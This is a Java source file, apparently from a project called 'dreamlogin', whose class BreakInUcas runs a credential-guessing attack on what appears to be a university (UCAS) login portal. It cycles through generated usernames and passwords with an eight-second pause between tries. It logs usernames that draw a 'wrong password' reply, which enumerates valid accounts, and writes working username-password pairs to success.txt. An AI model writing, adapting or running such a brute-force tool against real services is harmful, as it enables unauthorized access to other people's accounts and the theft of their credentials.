package com.duansky.dreamlogin;

import com.duansky.bean.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;

import static com.duansky.dreamlogin.DreamLogin.rootPath;

/**
 * Created by SkyDream on 2016/7/14.
 */
public class BreakInUcas {

    private String upsFilePath = rootPath + File.separator + "success.txt";
    private String usernameFilePath = rootPath + File.separator + "username.txt";

    private PrintWriter upOut;
    private PrintWriter usernameOut;

    private UcasLogin login = new UcasLogin();
    private UcasLogout logout = new UcasLogout();

    public BreakInUcas(){
        try {
            upOut = new PrintWriter(new OutputStreamWriter(new FileOutputStream(upsFilePath)));
            usernameOut = new PrintWriter(new OutputStreamWriter(new FileOutputStream(upsFilePath)));
        }catch (Exception e){
            System.out.println("wrong file path!");
        }
    }

    private void parse(LoginInfo info, String res){
        UcasMessage m = wrap(res);
        switch (m){
            case PASSWORD_ERROR:
                System.out.println("get the right username but wrong password " + info);
                usernameOut.println(info.getUsername());
                usernameOut.flush();
                break;
            case SUCCESS:
                System.out.println("******************SUCCESS******************" + info);
                upOut.println(info);
                upOut.flush();
                logout.logout(new LogoutInfo(info.getUsername(),info.getPassword(),info.getUserIndex()));
                break;
            default:
                System.out.println("unknown result:"+res);
        }
    }

    private UcasMessage wrap(String res){
        if(res.contains(UcasMessage.PASSWORD_ERROR.getContent()))
            return UcasMessage.PASSWORD_ERROR;
        if(res.contains(UcasMessage.SUCCESS.getContent()))
            return UcasMessage.SUCCESS;
        return UcasMessage.UNKNOWN;
    }

    public void breakinUcas(){
        String userName = UserNameFactory.getNextUserName();
        String password = PasswordFactory.getNextPassword();

        String res = "";

        while(userName != null && password != null){
            LoginInfo info = new LoginInfo(userName,password);

            res = login.login(info);
            if(res != null && res.length() != 0)
                parse(info,res);

            userName = UserNameFactory.getNextUserName();
            password = PasswordFactory.getNextPassword();

            try {
                Thread.sleep(8*1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
